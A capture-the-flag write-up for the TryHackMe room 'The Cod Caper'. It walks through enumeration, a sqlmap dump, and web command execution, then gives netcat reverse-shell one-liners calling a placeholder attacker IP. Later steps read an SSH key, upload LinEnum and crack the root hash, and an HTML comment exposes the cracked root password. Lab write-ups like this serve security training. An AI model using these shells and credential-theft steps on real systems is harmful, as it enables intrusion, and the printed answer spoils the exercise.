---
title: THM The Cod Caper
date: 2021-01-13 22:50:00 +0000
categories: [Security, TryHackMe]
tags: [thm, codcapper, writeup]     # TAG names should always be lowercase
---

## Task 2
> Host Enumeration

```console
nmap -sV <ip> -v
```

You will found all the answer with this command.

## Task 3
> Web Enumeration

```console
gobuster dir -u <ip> -w /usr/share/wordlists/dirb/big.txt
```

Analyze the result, a page name may inspired you.

## Task 4
> Web Exploitation

```console
sqlmap -u "<url>" --forms --dump -a
```
where url is the link to the previous page name discover (http://ip:port/pagename)

## Task 5
> Command Execution

We got access to a web page where we can run some linux command and receive the result directly in our webpage.
Try basic stuf like pwd or ls give us some result.
```console
ls -l | wc -l
```
to have the number of files inside current directory.

Checking /etc/passwd we found a user named pingu.

Did not succeed to have a stable shell with netcat
```console
nc -e /bin/sh <ip> <port>
```
or even more complicated with something like 
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f)
```
Success to have a reverse shell with
```console
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

```console
find / -user pingu
```
we found the path to the ssh rsa key (cat /home/pingu/.ssh/id_rsa)
Did not succeed to hack the RSA passphrase

After some research inside the box, we found an interresting folder in ``` /var ```. Password of pingu is inside.

## Task 6
> LinEnum

Choose a metod to send LinEnum.sh file into the target system (SCP or setup a simpleHTTPServer inside your own attack machine).
Then, upgrade the permission with ``` chmod +x LinEnum.sh ``` and then execute ``` LinEnum.sh ``` and, as specified inside the room, check the SUID files analysis result. You will easily found the requested one.

Try to execute this file without success. It seems that the file is waiting for an entry. Let's continue the room.

## Task 7
> pwndbg

Nothing to do, just follow the room description and do it to understand

## Task 8
> Binary-Exploitation: Manually

Nothing to do, just follow the room description and do it to understand

## Task 9
> Binary-Exploitation: The pwntools way

Nothing to do, just follow the room description and do it to understand

## Task 10
> Finishing the job

```console
hashcat -a 0 -m 1800 root.hash /usr/share/wordlists/rockyou.txt
```
We have quickly an answer (less than 10min on my machine):
```console
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:l*******h
```
<!-- $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish -->

